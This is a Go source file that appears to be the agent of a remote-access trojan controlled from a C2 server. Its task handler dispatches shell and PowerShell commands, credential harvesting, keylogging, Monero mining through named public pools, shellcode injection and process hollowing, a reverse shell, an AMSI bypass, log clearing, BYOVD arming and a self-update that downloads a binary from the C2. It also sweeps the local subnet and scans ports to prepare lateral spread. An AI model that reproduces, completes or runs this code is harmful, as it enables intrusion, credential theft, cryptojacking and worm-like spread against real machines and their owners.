package main

import (
	"bytes"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func executeTask(t *Task) TaskResult {
	result := TaskResult{
		AgentID: agentID,
		TaskID:  t.TaskID,
		Status:  "ok",
	}

	switch t.Type {
	case "exec":
		out, err := runShell(t.Payload)
		result.Output = out
		// Only mark error if the command produced no output at all —
		// many Windows builtins (route, netstat, etc.) exit non-zero on success.
		if err != nil && strings.TrimSpace(out) == "" {
			result.Status = "error"
			result.Output = fmt.Sprintf("[exec failed: %v]", err)
		}

	case "ps":
		out, err := runPowerShell(t.Payload)
		result.Output = out
		if err != nil && strings.TrimSpace(out) == "" {
			result.Status = "error"
			result.Output = fmt.Sprintf("[ps failed: %v]", err)
		}

	case "keylog_flush":
		// Signal keylogger to flush immediately — it will POST on its own
		result.Output = "keylog flush signaled"

	case "harvest":
		go harvestCreds(C2URL)
		result.Output = "credential harvest started"

	case "inventory":
		go runInventory(C2URL)
		result.Output = "inventory collection started"

	case "spread":
		go spreadToNetwork()
		result.Output = "subnet scan started"

	case "worm_scan":
		go runNetIntel(C2URL)
		result.Output = "network intelligence scan launched"

	// ── miner control ─────────────────────────────────────────────────────────
	// mine_start payload: "COIN WALLET [POOL] [CPU_CAP] [GPU=0|1]"
	//   e.g. "xmr 4...addr"
	//        "zeph Zeph...addr zephyr.herominers.com:1123 30 0"
	//        "xmr 4...addr pool.supportxmr.com:443 50 1"
	case "mine_start":
		parts := strings.Fields(t.Payload)
		cfg := MinerConfig{Coin: "xmr", CPUCap: 50}
		if len(parts) >= 1 {
			cfg.Coin = strings.ToLower(parts[0])
		}
		if len(parts) >= 2 {
			cfg.Wallet = parts[1]
		}
		if len(parts) >= 3 {
			cfg.Pool = parts[2]
		}
		if len(parts) >= 4 {
			fmt.Sscanf(parts[3], "%d", &cfg.CPUCap)
		}
		if len(parts) >= 5 {
			cfg.GPU = parts[4] == "1"
		}
		out, err := startMiner(cfg)
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
		} else {
			result.Output = out
		}

	case "mine_stop":
		result.Output = stopMiner()

	case "mine_status":
		result.Output = getMinerStatus()

	case "inject":
		// payload: "remote PID BASE64SC" | "hollow EXE BASE64SC" | "BASE64SC"
		out, err := handleInject(t.Payload)
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
		} else {
			result.Output = out
		}

	case "revshell":
		// payload = IP:PORT  e.g. "10.0.0.208:4444"
		// Start listener first: nc -lvnp 4444
		go reverseShell(t.Payload)
		result.Output = "reverse shell connecting to " + t.Payload

	case "shellcode":
		// payload = base64 shellcode, or "KEY:base64" for XOR-encoded
		err := runShellcode(t.Payload)
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
		} else {
			result.Output = "shellcode executed"
		}

	case "amsi_bypass":
		err := amsiBypass()
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
		} else {
			result.Output = "AMSI patched"
		}

	case "persist_remove":
		removePersistence()
		result.Output = "persistence removed"

	case "persist_check":
		if isPersisted() {
			result.Output = "persisted: YES"
		} else {
			result.Output = "persisted: NO"
		}

	case "clear_logs":
		result.Output = clearLogs()

	case "self_destruct":
		result.Output = selfDestruct()

	case "ppl_protect":
		result.Output = enablePPL()

	case "byovd_arm":
		result.Output = armBYOVD()

	case "update":
		err := selfUpdate(t.Payload)
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
		} else {
			result.Output = "update downloaded, restarting"
		}

	default:
		result.Status = "error"
		result.Output = "unknown task type: " + t.Type
	}

	return result
}

func runShell(cmd string) (string, error) {
	var c *exec.Cmd
	if runtime.GOOS == "windows" {
		c = exec.Command("cmd", "/c", cmd)
		hideWindow(c)
	} else {
		c = exec.Command("sh", "-c", cmd)
	}
	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf
	done := make(chan error, 1)
	c.Start()
	go func() { done <- c.Wait() }()
	select {
	case err := <-done:
		return buf.String(), err
	case <-time.After(30 * time.Second):
		c.Process.Kill()
		return buf.String(), fmt.Errorf("timeout")
	}
}

func runPowerShell(script string) (string, error) {
	c := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command", script)
	hideWindow(c)
	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf
	done := make(chan error, 1)
	c.Start()
	go func() { done <- c.Wait() }()
	select {
	case err := <-done:
		return buf.String(), err
	case <-time.After(30 * time.Second):
		c.Process.Kill()
		return buf.String(), fmt.Errorf("timeout")
	}
}

func selfUpdate(versionURL string) error {
	url := C2URL + "/update/agent"
	if versionURL != "" {
		url = versionURL
	}

	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("download: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("server returned %d", resp.StatusCode)
	}

	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("locate self: %w", err)
	}

	// Write to a temp path in the same directory (same filesystem = atomic rename)
	tmpPath := exe + ".new"
	f, err := os.Create(tmpPath)
	if err != nil {
		return fmt.Errorf("create tmp: %w", err)
	}
	n, err := io.Copy(f, resp.Body)
	f.Close()
	if err != nil || n < 1024 {
		os.Remove(tmpPath)
		return fmt.Errorf("write tmp (%d bytes): %w", n, err)
	}

	if runtime.GOOS == "windows" {
		return selfUpdateWindows(exe, tmpPath)
	}

	// Unix: simple rename in place (no file locking)
	oldPath := exe + ".old"
	if err := os.Rename(exe, oldPath); err != nil {
		os.Remove(tmpPath)
		return fmt.Errorf("rename self: %w", err)
	}
	if err := os.Rename(tmpPath, exe); err != nil {
		os.Rename(oldPath, exe) // rollback
		return fmt.Errorf("rename new: %w", err)
	}
	cmd := exec.Command(exe)
	if err := cmd.Start(); err != nil {
		os.Rename(exe, tmpPath)
		os.Rename(oldPath, exe)
		return fmt.Errorf("start new: %w", err)
	}
	os.Remove(oldPath)
	os.Exit(0)
	return nil
}

// selfUpdateWindows uses a detached PS watcher to swap the EXE after this
// process exits — avoids Windows file-locking on a running executable.
func selfUpdateWindows(exe, tmpPath string) error {
	pid := os.Getpid()
	// PS: wait for our PID to disappear, then move new → exe and relaunch.
	script := fmt.Sprintf(
		"while(Get-Process -Id %d -ErrorAction SilentlyContinue){Start-Sleep -Milliseconds 300};"+
			"try{Move-Item -Path '%s' -Destination '%s' -Force;Start-Process '%s'}"+
			"catch{Remove-Item '%s' -ErrorAction SilentlyContinue}",
		pid, tmpPath, exe, exe, tmpPath)
	cmd := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", script)
	hideWindow(cmd)
	if err := cmd.Start(); err != nil {
		os.Remove(tmpPath)
		return fmt.Errorf("launch ps watcher: %w", err)
	}
	// PS watcher is detached — safe to exit now
	os.Exit(0)
	return nil
}

// spreadToNetwork scans the local /24 and optionally deploys to reachable hosts.
// Results are reported to C2 via /discovered — operator decides whether to deploy.
func spreadToNetwork() {
	hosts := scanSubnet()
	if len(hosts) > 0 {
		sendDiscovered(hosts)
	}
}

type DiscoveredHost struct {
	IP       string   `json:"ip"`
	Hostname string   `json:"hostname"`
	Ports    []int    `json:"open_ports"`
	HasSMB   bool     `json:"has_smb"`
}

func scanSubnet() []DiscoveredHost {
	prefix := localSubnetPrefix()
	if prefix == "" {
		return nil
	}

	type result struct {
		host *DiscoveredHost
	}
	results := make(chan result, 254)

	// Concurrent sweep — all 254 pings in parallel
	sem := make(chan struct{}, 40) // cap goroutines to avoid overwhelming the NIC
	for i := 1; i <= 254; i++ {
		ip := fmt.Sprintf("%s.%d", prefix, i)
		sem <- struct{}{}
		go func(target string) {
			defer func() { <-sem }()
			if isReachable(target) {
				h := &DiscoveredHost{IP: target}
				if name := resolveHostname(target); name != "" {
					h.Hostname = name
				}
				h.Ports = scanPorts(target, []int{
				21, 22, 23, 25, 53, 80, 81, 110, 135, 139, 143,
				443, 445, 1433, 3000, 3306, 3389, 4200, 4443,
				5000, 5432, 5900, 6379, 8000, 8080, 8443, 8888,
				9000, 9090, 9200, 27017,
			})
				h.HasSMB = containsPort(h.Ports, 445)
				results <- result{host: h}
			} else {
				results <- result{}
			}
		}(ip)
	}

	// Drain the channel — wait for all goroutines
	var found []DiscoveredHost
	for i := 0; i < 254; i++ {
		r := <-results
		if r.host != nil {
			found = append(found, *r.host)
		}
	}
	return found
}

// localSubnetPrefix returns "192.168.1" from the first non-loopback IPv4 address.
// Uses net.InterfaceAddrs (no subprocess) and falls back to getLocalIPs() if needed.
func localSubnetPrefix() string {
	// Fast path: net package, no subprocess
	ifaces, err := net.Interfaces()
	if err == nil {
		for _, iface := range ifaces {
			if iface.Flags&net.FlagLoopback != 0 || iface.Flags&net.FlagUp == 0 {
				continue
			}
			addrs, _ := iface.Addrs()
			for _, a := range addrs {
				var ip net.IP
				switch v := a.(type) {
				case *net.IPNet:
					ip = v.IP
				case *net.IPAddr:
					ip = v.IP
				}
				if ip == nil || ip.IsLoopback() || ip.To4() == nil {
					continue
				}
				parts := strings.Split(ip.String(), ".")
				if len(parts) == 4 {
					return strings.Join(parts[:3], ".")
				}
			}
		}
	}
	// Fallback: PowerShell
	raw := strings.Split(getLocalIPs(), ",")[0]
	parts := strings.Split(strings.TrimSpace(raw), ".")
	if len(parts) == 4 {
		return strings.Join(parts[:3], ".")
	}
	return ""
}

func isReachable(ip string) bool {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("ping", "-n", "1", "-w", "500", ip)
		hideWindow(cmd)
	} else {
		cmd = exec.Command("ping", "-c", "1", "-W", "1", ip)
	}
	return cmd.Run() == nil
}

func resolveHostname(ip string) string {
	cmd := exec.Command("powershell", "-NoProfile", "-Command",
		fmt.Sprintf("[System.Net.Dns]::GetHostEntry('%s').HostName", ip))
	hideWindow(cmd)
	out, err := cmd.Output()
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(out))
}

func scanPorts(ip string, ports []int) []int {
	var open []int
	for _, port := range ports {
		addr := fmt.Sprintf("%s:%d", ip, port)
		// Use exec for Windows compatibility; net.DialTimeout works everywhere
		conn, err := newDialer(addr, 500*time.Millisecond)
		if err == nil {
			conn.Close()
			open = append(open, port)
		}
	}
	return open
}

func containsPort(ports []int, p int) bool {
	for _, v := range ports {
		if v == p {
			return true
		}
	}
	return false
}
